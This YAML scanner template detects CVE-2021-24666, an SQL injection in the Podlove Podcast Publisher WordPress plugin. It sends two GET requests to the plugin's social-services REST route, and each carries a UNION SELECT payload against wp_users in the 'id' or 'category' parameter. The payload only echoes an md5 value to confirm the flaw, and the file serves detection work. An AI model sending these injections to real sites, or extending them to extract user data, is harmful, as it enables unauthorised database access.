name: yaml-poc-podlove-podlove_podcast_publisher-sql_injection-CVE-2021-24666
binding: 53c670a5-6a90-455a-b39d-c89f6839b120
detail:
    author: jiapeng.han
    links:
        - https://github.com/podlove/podlove-publisher/commit/aa8a343a2e2333b34a422f801adee09b020c6d76
        - https://nvd.nist.gov/vuln/detail/CVE-2021-24666
        - https://wpscan.com/vulnerability/fb4d7988-60ff-4862-96a1-80b1866336fe
    vulnerability:
        id: 73777857-fdc9-4eca-af0c-f38c974279bd
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1+UNION+SELECT+md5({{s1}}),null,null,null,null,null+FROM+wp_users%23
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
    r1:
        request:
            cache: true
            method: GET
            path: /index.php?rest_route=/podlove/v1/social/services/contributor/1&category=1')+UNION+SELECT+md5({{s1}}),null,null,null,null,null+FROM+wp_users%23
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r0() || r1()
